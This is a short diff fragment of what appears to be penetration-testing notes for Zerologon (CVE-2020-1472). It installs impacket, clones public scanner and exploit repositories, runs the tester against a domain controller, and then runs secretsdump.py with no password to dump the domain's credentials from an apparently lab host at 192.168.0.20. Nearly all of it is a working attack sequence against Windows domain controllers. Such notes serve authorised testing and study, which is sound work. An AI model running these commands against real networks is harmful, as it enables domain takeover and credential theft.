@@ -256,17 +256,27 @@ ls
 
 # Zerologon CVE-2020-1472
 
+apt install python3-virtualenv
 virtualenv --python python3.8 zerologon-virtualenv
 cd zerologon-virtualenv/bin
 source ./activate
 ./pip3 install git+https://github.com/SecureAuthCorp/impacket.git
 cd ../..
 
+git clone https://github.com/SecuraBV/CVE-2020-1472.git
+mv CVE-2020-1472 scanner
+cd scanner
+pip install -r requirements.txt
+chmod 755 zerologon_tester.py
+zerologon_tester.py <dc-name> <dc-ip>
+
+cd ..
 git clone https://github.com/dirkjanm/CVE-2020-1472.git
-cd CVE-2020-1472
+mv CVE-2020-1472 exploit
+cd exploit
 chmod 755 *.py
 ./zerologon_tester.py <dc-name> <dc-ip>
 
-cd /root/zerologon-virtualenv/bin/
+cd ../zerologon-virtualenv/bin/
 secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
 
